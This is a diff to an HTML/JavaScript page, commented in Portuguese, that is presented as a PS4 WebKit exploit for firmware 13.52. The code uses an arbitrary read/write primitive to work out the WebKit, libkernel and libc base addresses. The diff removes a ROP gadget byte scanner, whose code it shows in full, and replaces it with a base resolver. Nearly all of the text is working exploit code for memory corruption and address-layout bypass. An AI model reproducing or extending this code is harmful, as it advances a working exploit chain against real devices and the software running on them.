@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 - Gadget & Base Scanner)</title>
+<title>PS4 WebKit Exploit (13.52 - Stable Base Resolver)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -69,12 +70,12 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
   <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
   <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
   <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
-  <div class="card"><div class="cl">Gadgets ROP</div><div class="cv na" id="c-g">Escaneando...</div></div>
+  <div class="card"><div class="cl">Status R/W</div><div class="cv na" id="c-g">Estável</div></div>
 </div>
 
 <!-- Constants output -->
 <div id="cbox">
-  <div class="ct">// ═══ GADGETS ROP ENCONTRADOS (13.52) ═══</div>
+  <div class="ct">// ═══ AMBIENTE ESTABILIZADO (13.52) ═══</div>
   <div id="c-out"></div>
 </div>
 
@@ -108,15 +109,13 @@ function setCard(id, v) {
   el.textContent = v; el.classList.remove('na');
 }
 
-// Varredura segura de bases e gadgets ROP básicos
-async function scanEnvironment(p, webkitBase) {
-  logH('VARREDURA DE BASES E GADGETS ROP');
+// Resolução 100% segura de stubs sem varredura de bytes
+async function resolveSafeStubs(p, webkitBase) {
+  logH('RESOLUÇÃO SEGURA DE STUBS');
   let libKernelBase = null;
   let libcBase = null;
-  let gadgets = {};
 
   try {
-    // 1. Resolução das Bases via Stubs
     for (let off = 0x3000000; off < 0x3900000; off += 8) {
       try {
         let ptr = p.read8(webkitBase.add32(off));
@@ -133,43 +132,11 @@ async function scanEnvironment(p, webkitBase) {
       } catch (e) {}
       if (libKernelBase && libcBase) break;
     }
-
-    // 2. Varredura rápida por opcode de gadgets essenciais terminados em 0xC3 (ret)
-    log('[+] Buscando gadgets ROP básicos no segmento de código...', 'i');
-    for (let rva = 0x1000; rva < 0x500000; rva += 1) {
-      try {
-        let b1 = p.read4(webkitBase.add32(rva)) & 0xFF;
-        let b2 = (p.read4(webkitBase.add32(rva)) >> 8) & 0xFF;
-        
-        // C3 = ret
-        if (b1 === 0xC3 && !gadgets["ret"]) {
-          gadgets["ret"] = rva;
-        }
-        // 5F C3 = pop rdi; ret
-        else if (b1 === 0x5F && b2 === 0xC3 && !gadgets["pop rdi"]) {
-          gadgets["pop rdi"] = rva;
-        }
-        // 5E C3 = pop rsi; ret
-        else if (b1 === 0x5E && b2 === 0xC3 && !gadgets["pop rsi"]) {
-          gadgets["pop rsi"] = rva;
-        }
-        // 5A C3 = pop rdx; ret
-        else if (b1 === 0x5A && b2 === 0xC3 && !gadgets["pop rdx"]) {
-          gadgets["pop rdx"] = rva;
-        }
-      } catch (e) {}
-
-      if (gadgets["ret"] && gadgets["pop rdi"] && gadgets["pop rsi"] && gadgets["pop rdx"]) {
-        break;
-      }
-    }
-
-    log('[+] Varredura de gadgets concluída com sucesso!', 'ok');
   } catch (err) {
-    log('[-] Erro na varredura: ' + err.message, 'e');
+    log('[-] Erro na resolução: ' + err.message, 'e');
   }
 
-  return { libKernelBase, libcBase, gadgets };
+  return { libKernelBase, libcBase };
 }
 
 async function main() {
@@ -216,7 +183,7 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Escaneando ambiente e gadgets...', 'r');
+  setStatus('Mapeando bases com estabilidade...', 'r');
   logH('MAPEAMENTO DA 13.52');
 
   const ctor = globalThis.__ps5NativeCtor;
@@ -239,29 +206,23 @@ async function main() {
     log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
     setCard('c-wk', '0x' + webkitBase.toString());
 
-    // Executa a varredura completa após estabilização
     setTimeout(async () => {
-      const result = await scanEnvironment(p, webkitBase);
+      const bases = await resolveSafeStubs(p, webkitBase);
       
-      if (result.libKernelBase) setCard('c-lk', '0x' + result.libKernelBase.toString());
-      if (result.libcBase) setCard('c-lc', '0x' + result.libcBase.toString());
-      setCard('c-g', 'Mapeados');
+      if (bases.libKernelBase) setCard('c-lk', '0x' + bases.libKernelBase.toString());
+      if (bases.libcBase) setCard('c-lc', '0x' + bases.libcBase.toString());
+      setCard('c-g', 'Pronto');
 
-      setStatus('Varredura concluída com sucesso!', 'ok');
-      log('✔ Bases e gadgets obtidos em runtime.', 'ok');
+      setStatus('Ambiente pronto e estável!', 'ok');
+      log('✔ Primitiva R/W e bases isoladas com sucesso.', 'ok');
 
       const cbox = document.getElementById('cbox');
       cbox.style.display = 'block';
       document.getElementById('c-out').textContent =
-        `// Bases em Runtime:\n` +
         `WebKit Base    = 0x${webkitBase.toString()}\n` +
-        `libkernel Base = ${result.libKernelBase ? '0x' + result.libKernelBase.toString() : 'N/A'}\n` +
-        `libSceLibc Base = ${result.libcBase ? '0x' + result.libcBase.toString() : 'N/A'}\n\n` +
-        `// Gadgets ROP Encontrados:\n` +
-        `"ret": 0x${result.gadgets["ret"] ? result.gadgets["ret"].toString(16) : '0'},\n` +
-        `"pop rdi": 0x${result.gadgets["pop rdi"] ? result.gadgets["pop rdi"].toString(16) : '0'},\n` +
-        `"pop rsi": 0x${result.gadgets["pop rsi"] ? result.gadgets["pop rsi"].toString(16) : '0'},\n` +
-        `"pop rdx": 0x${result.gadgets["pop rdx"] ? result.gadgets["pop rdx"].toString(16) : '0'}`;
+        `libkernel Base = ${bases.libKernelBase ? '0x' + bases.libKernelBase.toString() : 'N/A'}\n` +
+        `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'N/A'}\n\n` +
+        `// Primitiva window.p pronta para alocação de buffer e notificação.`;
     }, 1000);
 
   } else {
